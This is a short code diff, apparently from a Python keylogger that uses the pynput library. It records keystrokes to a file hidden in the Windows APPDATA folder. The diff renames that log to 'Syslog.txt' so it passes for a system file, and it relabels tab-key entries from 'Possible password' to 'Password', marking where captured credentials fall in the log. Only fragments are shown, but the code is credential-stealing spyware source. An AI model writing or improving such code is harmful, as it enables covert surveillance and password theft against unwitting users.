@@ -7,7 +7,7 @@ import os
 
 keys = []
 
-log_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "log.txt")
+log_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Syslog.txt")
 # Objects in PYNPUT to compare and clean logging
 specials = [
     pynput.keyboard.Key.backspace, pynput.keyboard.Key.enter, pynput.keyboard.Key.space, pynput.keyboard.Key.tab,
@@ -25,7 +25,7 @@ specials = [
 # Custom Functions to write dates
 def on_tab(key):
     try:
-        value = ',{0}\n "Possible password"'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
+        value = ',{0}\n "Password"'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
         keys.append(value)
         write_file(keys)
     except Exception as e:
